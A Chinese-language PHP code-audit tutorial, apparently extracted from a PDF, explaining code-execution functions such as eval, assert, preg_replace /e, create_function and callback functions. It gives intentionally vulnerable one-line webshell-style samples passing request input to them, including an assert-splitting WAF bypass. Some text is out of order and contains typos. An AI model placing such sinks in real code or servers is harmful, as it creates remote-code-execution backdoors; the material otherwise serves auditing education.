@@ -1,0 +1,249 @@
+PHP 代码审计之代码执行  
+1. 代码执行原理  
+为了代码的灵活性与简洁性，会适当调用 PHP 中的一些代码执行函数来完成一些系统的功能，而代码执
+行的函数相当于可以直接调用 PHP 中任意代码来执行，更重要的是代码执行可以通过调用命令执行的函
+数来执行系统命令 , 来达到控制后台甚至我们的服务器，这就是我们所说的 RCE(远程代码 / 命令执行漏洞)
+的由来。
+1.1 代码执行示例代码  
+eval.php
+以最常见的一句话木马为例，我们通过代码执行函数eval()来进行演示，假设我们eval()中的参数可
+控，我们就可以控制我们传入的参数来造成 RCE 。
+由于这里的value参数可控，我们传入 PHP 中的phpinfo()函数即可输出 PHP 配置信息。值得注意的是
+eval() 中传入的函数必须要用分号来结尾，否则会报出致命性错误，导致执行中断。
+也可以传入我们 PHP 中命令执行的函数来执行系统命令，这就是我们上篇所说的代码执行也可以当作命
+令执行的原理。
+<?php
+highlight_file(__FILE__);         // 为了方便演示我们使用 highlight_file() 函数将源码高亮
+显示在前端
+$arg = $_REQUEST['value'];
+eval($arg);
+?>
+在eval()函数中可以传入多个函数来执行，每个函数也必需要用分号进行分割。
+2. 代码执行相关函数  
+eval()  
+将传入的字符串当作 PHP 代码来执行，代码示例如上图。
+assert()  
+其与eval()类似，传入的内容会被当做代码来执行，不同的是 eval 中传入的值可以不用分号来结尾。
+示例代码：
+<?php
+highlight_file(__FILE__);
+$arg = $_REQUEST['value'];
+assert($arg);
+?>
+同样也可以调用命令执行函数来执行系统命令
+assert() 函数也可进行拆分调用，这是与eval()函数很大的不同点，有时可以用来绕过一些 WAF 的防
+御。
+示例代码：
+<?php
+highlight_file(__FILE__);
+$a='ass';
+$b='ert';
+$c=$a.$b;
+@$c($_REQUEST['value']);
+?>
+preg_replace()  
+该函数有三个参数，用于执行一个正则表达式的搜索和替换 
+搜索  subject 中匹配pattern 的部分，  如果匹配成功以replacement 进行替换 
+语法：
+示例代码：
+由于使用/e传入的phpinfo()会被当做代码来执行
+ preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int 
+$limit = -1 [, int &$count ]] ) 
+$pattern 存在 /e 模式修正符，允许代码执行
+/e 模式修正符，是 preg_replace()将 $replacement 参数值当做 php 代码来执行
+<?php
+highlight_file(__FILE__);
+$arg = $_REQUEST['value'];
+@preg_replace("/123/e",$arg,"1234567");  // 在字符串 1234567 中匹配 123 并用传入的值进行替
+换，并且传入的值被当作代码来执行
+?>
+create_function()  
+PHP 中的匿名函数，相当于定义了一个没有名字的函数，该函数直接用变量进行调用。
+第一个参数参数是函数传递的参数，第二个参数相当于函数中的函数体。
+语法：
+代码示例：
+第二个参数会在内部执行eval()，在这里也就是执行后面的return语句
+上面的代码可以等价于以下代码只不过匿名函数是用变量来调用的，而非匿名变量是通过函数名来调用
+的。
+显然他们的计算结果是相同的
+create_function ( string $args , string $code )
+<?php
+highlight_file(__FILE__);
+$func = create_function('$a,$b', 'return $a + $b;');
+echo $func(2, 3) . "\n";
+?> 
+<php
+    highlight_file(__FILE__);
+    function  func($a,$b){
+    return $a+$b;
+} 
+echo func(2,3)   
+?>
+代码示例：
+当create_function()中传入的参数可控时就会造成代码执行
+由于$a在被调用时才会触发执行匿名函数，所以我们通过传入的参数闭合该匿名函数的}，就造成了代
+码执行 , 实际情况中要根据具体闭合条件进行闭合，从而使我们想要执行的代码独立出来。
+//     注释当前行代码 ( 单行注释 )
+/*    注释之后所有代码 ( 多行注释 )
+<?php
+highlight_file(__FILE__);
+$a = create_function('$arg',$_REQUEST['x']);
+?>
+
+array_map()  
+array_map() 函数返回用户自定义函数作用后的数组。回调函数接受的参数数目应该和传递给 
+array_map() 函数的数组数目一致。
+语法：
+代码示例：
+array_map()将调用sum_num()函数，去执行该函数，这也就是上面所说的函数回调。且后面传入的
+参数要与回调的函数参数数目保持一致。
+代码示例：
+当传入的参数可控时就会造成代码执行
+array_map(function,array1,array2,array3...)
+<?php
+highlight_file(__FILE__);
+function sum_num($v,$s)
+{
+ return $v+$s;
+}
+$a=array(45,33);
+$b=array(45,33);
+var_dump(array_map("sum_num",$a,$b)); ;
+?>
+当我们传入 assert,array_map()函数就会回调assert()函数去执行我们后面传入的参数phpinfo(),
+相当于assert(phpinfo())
+call_user_func()  
+第一个参数作为回调函数调用 , 其余参数是回调函数的参数：
+语法：
+代码示例：
+第一个参数welcome作为回调函数进行调用，后面则需要传入我们回调函数所需的参数，如下面的
+$city。
+示例代码：
+当我们传入的参数可控时就会造成 RCE
+<?php 
+    highlight_file(__FILE__);
+    $cmd = array_map($_REQUEST['arg1'],array($_REQUEST['arg2'])); 
+?>
+call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )
+<?php
+highlight_file(__FILE__);
+function welcome($city)
+{
+    echo "Welcome to $city !<br>";
+}
+call_user_func('welcome', "BeiJing");
+call_user_func('welcome', "ShangHai");
+?>
+call_user_func_array()  
+把第一个参数作为回调函数（ callback ）调用，把参数数组作（ param_arr ）为回调函数的的参数传入 ,
+与call_user_func()函数不同的是，该函数传入的参数是以数组的形式传入的。
+语法：
+示例代码：
+这里需要注意的是参数必须以数组形式传入 , 如下面的$a。
+示例代码：
+当传入的参数可控时就会造成 RCE
+<?php 
+    highlight_file(__FILE__);
+    call_user_func($_GET['a1'],$_GET['a2']); 
+?>
+call_user_func_array ( callable $callback , array $param_arr )
+<?php
+highlight_file(__FILE__);
+function porduct_num($v,$s)
+{
+ return $v*$s;
+}
+$a=array(2,3);
+echo call_user_func_array("product_num",$a); 
+?>
+这里的arg2传入的参数就是以数组形式就行传递的
+如果直接不以数组形式就行传递就会导致致命错误
+array_filter()  
+把输入数组中的每个键值传给回调函数，与call_user_func_array()不同的是，该函数的第一个参数
+为回调函数的参数，而第二个参数则是传入的回调函数。
+代码示例：
+当传入的参数可控时就会造成 RCE
+<?php 
+    highlight_file(__FILE__);
+    call_user_func_array($_GET['arg1'],$_GET['arg2']); 
+?>
+<?php 
+    highlight_file(__FILE__);
+    array_filter(array($_REQUEST['arg1']),$_REQUEST['arg2']); 
+?>
+ob_start()  
+ 用于打开输出控制缓冲，如果参数可控也可造成 RCE 。
+usort()  
+使用用户自定义的比较函数对数组中的元素进行排序，该函数第二个参数是用户自定义的回调函数。
+语法：
+代码示例：
+回调用户自定义my_sort()函数对$a数组中的值进行排序
+<?php 
+    highlight_file(__FILE__);
+    $cmd = 'system';
+    ob_start($cmd);           // 打开输出区缓存
+    echo "$_REQUEST['arg']";
+    ob_end_flush();           // 关闭缓存
+?>
+usort ( array &$array , callable $value_compare_func )
+<?php
+highlight_file(__FILE__);
+function my_sort($a, $b)
+{
+    if ($a == $b) return 0;
+    return ($a < $b) ? -1 : 1;
+}
+$a = array(4, 2, 8, 6,10,21);
+var_dump(usort($a, "my_sort"));
+$arrlength=count($a);
+for($x=0;$x<$arrlength;$x++)
+{
+    echo $a[$x];
+    echo "<br>";
+}
+?>
+代码示例：
+如果usort()函数参数可控 , 也可能可造成 RCE 。 PHP 版本 >=5.6 可实现
+array_walk()  
+使用用户自定义函数对数组中的每个元素做回调处理，该函数的第二个参数也为回调的自定义函数。
+语法：
+代码示例：
+<?php
+highlight_file(__FILE__);
+var_dump(usort($_REQUEST,"assert"));
+?>
+array_walk ( array &$array , callable $callback [, mixed $userdata = NULL ] )
+回调上面的myfunction()函数，对$a赋值的键值对进行处理。
+代码示例：
+如果array_walk()函数参数可控 , 也可能可造成 RCE
+由于传入的参数为数组，所以形参需在后面加[]
+<?php
+highlight_file(__FILE__);
+function myfunction($value,$key)
+{
+echo "The key $key has the value $value<br>";
+}
+$a=array("a"=>"red","b"=>"green","c"=>"blue");
+array_walk($a,"myfunction");
+?>
+<?php
+highlight_file(__FILE__);
+array_walk($_GET['arg1'],$_GET['arg2']);
+?>
+动态函数  
+PHP 函数直接由字符串拼接，且拼接内容可控就会导致 RCE
+示例代码：
+这种动态函数代码执行的方式相信大家很好理解，传入的第一个参数则为函数名，而第二个参数则传入
+参数值。如下面的system为函数，calc.exe为函数值，从而拼接后执行system(calc.exe); 弹出计
+算器。
+3. 代码执行代码审计总结  
+
+<?php
+highlight_file(__FILE__);
+$_REQUEST['arg1']($_REQUEST['arg2']);
+?>
+在代码审计中有很多关于代码执行的函数，新手期间大家不需要对函数进行深入的了解，只需要对上面的函数
+有一定的了解和印象，在实际中再次遇到上述函数时可以马上想起该函数和代码执行或者 RCE 有关，然后在进
+一步分析传入的参数是否可控 , 从而才有可能找到该漏洞。
+首先要对函数有一定的了解，自己尝试手动敲代码，让自己对这些函数加深一些印象，从而对以后大家正式进
+行代码审计才有更大的帮助。
